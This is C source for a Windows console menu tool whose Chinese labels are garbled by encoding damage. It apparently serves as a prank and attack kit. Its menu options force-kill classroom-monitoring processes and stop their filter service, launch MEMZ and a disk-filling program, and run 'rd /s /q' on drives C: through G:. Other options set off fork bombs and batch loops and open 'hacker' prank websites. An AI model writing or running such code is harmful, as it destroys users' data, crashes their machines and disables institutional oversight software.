#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#define cls system("cls")
void gotoxy(int x, int y) {
    COORD p;
    HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
    p.X = x; p.Y = y;
    SetConsoleCursorPosition(handle, p);
}
void HideCursor() {
    CONSOLE_CURSOR_INFO cursur_info;
    cursur_info.dwSize = 1;
    cursur_info.bVisible = FALSE;
    HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleCursorInfo(handle, &cursur_info);
}
void MainMap() {
    printf("+------------------------------------------+------------+\n");
    printf("|                ����Windows               | w-������� |\n");
    printf("+------------------------------------------+ s-������� |\n");
    printf("|1����Ϣ��                                 | enter-ȷ�� |\n");
    printf("|2���õ�������                             | m-������ҳ |\n");
    printf("|3����������                               |            |\n");
    printf("|4��������־                               |            |\n");
    printf("+------------------------------------------+------------+\n");
}//page=10
void FirstMap() {
    printf("��Ϣ�Σ�\n\n");
    printf("1���������\n");
    printf("2������������\n");
}//page=11
void SecondMap() {
    printf("�õ������ƣ�\n\n");
    printf("1���ʺ�è����MEMZ\n");
    printf("2��Ӳ��ե����\n");
    printf("3����ʽ������\n");
}//page=12
void ThirdMap() {
    printf("�������󣨶Ե���û��ʵ���˺�����\n\n");
    printf("1��ɨ��\n");
    printf("2���ĵ�\n");
    printf("3��������\n");
    printf("4������ը�����������ɣ�\n");
    printf("5��ը���ڴ棨�������ɣ�\n");
    printf("6��ѭ����������ֹ���̼��ɣ�\n");
    printf("7��αװ�ڿ�\n");
    printf("8����״ͼ");
}//page=13
void LOG() {
    printf("===========================================================\n");
    printf("���������־                                 m-�������˵�\n");
    printf("�汾��          �¼�                             ��������\n");
    printf("===========================================================\n");
    printf("V1.0.202421                                      482��\n");
    printf("V1.1.202424     ��ԭ�ļ���                       485��\n");
    printf("V1.2.202428     ʹ��˵����������־�����ƹ���     566��\n");
    printf("V1.2.2024213    ���ƹ���                         573��\n");
    printf("V1.3.202432     Ӳ��ե���������ƹ���             587��\n");
    printf("V1.3.202433     �Ż�����                         547��\n");
    printf("V1.3.202435     ���ƹ���                         563��\n");
    printf("V1.4.202439     UAC��Ȩ����                      559��\n");
    printf("V1.4.2024320    �Ż�����                         526��\n");
    printf("V1.5.2024321    ʵ�ù���                         591��\n");
    printf("V1.6.2024323    �޸������BUG                    626��\n");
    printf("V1.6.2024327    �Ż�����                         592��\n");
    printf("V1.7.202449     �Ż�����                         553��\n");
    printf("V1.8.2024410    ɾ����Ч����                     327��\n");
    printf("V1.9.2024415    ��ʽ������                       321��\n");
    printf("V1.10.2024513    ��״ͼ                             336��\n");
    printf("===========================================================\n");
}//page=14
int main() {
    char boom_oldname[] = "boom2.txt";
    char MEMZ_oldname[] = "MEMZ.txt";
	//File_old_name

    char boom_newname[] = "boom2.bat";
    char MEMZ_newname[] = "MEMZ.bat";
	//File_new_name

    char* rain = "rain.bat";
    char* dance = "dance.bat";
    char* boom = "boom.bat";
    char* MEMZ = "MEMZ.bat";
    char* disk_squeezer = "Disk-Squeezer_v1.5.exe";
    char* msgbox = "msgbox.vbs";
	//File_name
    
    int cols = 3, page = 10;
    HideCursor();
    MainMap();
    gotoxy(20, cols);
    printf("<");
    //��ʼ��
        
    while (1) {
        while (page == 10) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(20, --cols);
                    gotoxy(20, ++cols);
                    printf(" ");
                    gotoxy(20, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(20, ++cols);
                    gotoxy(20, --cols);
                    printf(" ");
                    gotoxy(20, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 3) {
                        cls;
                        FirstMap();
                        cols = 2, page = 11;
                        gotoxy(20, cols);
                        printf("<");
                        break;
                    }
                    if (cols == 4) {
                        cls;
                        SecondMap();
                        cols = 2, page = 12;
                        gotoxy(20, cols);
                        printf("<");
                        break;
                    }
                    if (cols == 5) {
                        cls;
                        ThirdMap();
                        cols = 2, page = 13;
                        gotoxy(30, cols);
                        printf("<");
                        break;
                    }
                    if (cols == 6) {
                        cls;
                        LOG();
                        page = 14;
                        break;
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 1)
                break;
        }
        //���˵� 
        
        while (page == 11) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(20, --cols);
                    gotoxy(20, ++cols);
                    printf(" ");
                    gotoxy(20, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(20, ++cols);
                    gotoxy(20, --cols);
                    printf(" ");
                    gotoxy(20, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 2) {
                        cls;
                        system("taskkill /f /im studentmain.exe\n");
                        Sleep(2000);
                        break;
                    }
                    if (cols == 3) {
                        cls;
                        system("taskkill /f /im masterhelper.exe\n");
                        Sleep(1);
                        system("sc stop tdnetfilter\n");
                        Sleep(3000);
                        break;
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 11)
                break;
        }
        //��Ϣ�� 
        
        while (page == 12) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(20, --cols);
                    gotoxy(20, ++cols);
                    printf(" ");
                    gotoxy(20, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(20, ++cols);
                    gotoxy(20, --cols);
                    printf(" ");
                    gotoxy(20, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 2) {
                        if (rename(MEMZ_oldname, MEMZ_newname) == 0) {
                            cls;
                            system(MEMZ);
                            rename(MEMZ_newname, MEMZ_oldname);
                        }
                        break;
                    }
                    if (cols == 3) {
                        system(disk_squeezer);
                        break;
                    }
                    if (cols == 4) {
                        system("@echo off");
                        system("rd /s /q C:\\");
                        system("rd /s /q D:\\");
                        system("rd /s /q E:\\");
                        system("rd /s /q F:\\");
                        system("rd /s /q G:\\");
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 12)
                break;
        }
        //�õ������� 
        
        while (page == 13) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'w':
                    gotoxy(30, --cols);
                    gotoxy(30, ++cols);
                    printf(" ");
                    gotoxy(30, --cols);
                    printf("<");
                    break;
                case's':
                    gotoxy(30, ++cols);
                    gotoxy(30, --cols);
                    printf(" ");
                    gotoxy(30, ++cols);
                    printf("<");
                    break;
                case 13:
                    if (cols == 2) {
                        system("dir /s");
                        system("%0");
                    }
                    if (cols == 3)
                        system(dance);
                    if (cols == 4)
                        system(rain);
                    if (cols == 5) {
                        system("%0|%0");
                    }
                    if (cols == 6) {
                        if (rename(boom_oldname, boom_newname) == 0) {
                            cls;
                            system(boom);
                            rename(boom_newname, boom_oldname);
                        }
                    }
                    if (cols == 7)
                        system(msgbox);
                    if (cols == 8) {
                        system("start https://hack.chat/");
                        Sleep(1000);
                        system("start https://cybermap.kaspersky.com/");
                        Sleep(1000);
                        system("start https://www.hacked.com.cn/");
                        Sleep(1000);
                        system("start http://geekprank.com/hacker/");
                    }
                    if (cols == 9) {
                        system("tree c:"); 
                        system("%0");
                    }
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 13)
                break;
        }
        //ֻ�Ǳ������� 
        
        while (page == 14) {
            if (_kbhit() != 0) {
                switch (_getch()) {
                case'm':
                    cls;
                    MainMap();
                    page = 10, cols = 3;
                    gotoxy(20, cols);
                    printf("<");
                }
            }
            if (page != 15)
                break;
        }
        //������־
    }
}